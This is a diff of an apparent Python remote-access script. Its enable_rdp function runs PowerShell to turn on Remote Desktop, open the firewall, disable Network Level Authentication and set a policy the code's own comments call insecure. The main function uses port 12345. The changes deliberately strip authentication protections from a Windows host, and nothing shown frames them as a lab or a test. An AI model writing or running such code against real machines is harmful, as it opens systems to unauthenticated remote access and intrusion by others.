@@ -45,24 +45,32 @@ def execute_command(command):
         print(f"Command execution failed: {e}")
 
 def enable_rdp():
-    # Enable RDP and set up firewall rules
-    command = """
+    # Enable Remote Desktop and set up firewall rules
+    enable_rdp_command = """
     powershell -Command "
     Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0;
     Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';
     "
     """
-    execute_command(command)
+    execute_command(enable_rdp_command)
     
-    # Set RDP to allow connections from any user (insecure)
-    command = """
+    # Disable Network Level Authentication (NLA)
+    disable_nla_command = """
     powershell -Command "
-    $regPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services';
-    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-    Set-ItemProperty -Path $regPath -Name 'fAllowUnrestrictedRDP' -Value 1;
+    Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'UserAuthentication' -Value 0;
     "
     """
-    execute_command(command)
+    execute_command(disable_nla_command)
+    
+    # Ensure RDP is set to allow connections from any user (insecure)
+    # This sets a policy to allow all users, but note this is not recommended for security reasons
+    allow_any_user_command = """
+    powershell -Command "
+    Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'fAllowUnrestrictedRDP' -Value 1;
+    "
+    """
+    execute_command(allow_any_user_command)
+
 
 def main():
     port = 12345
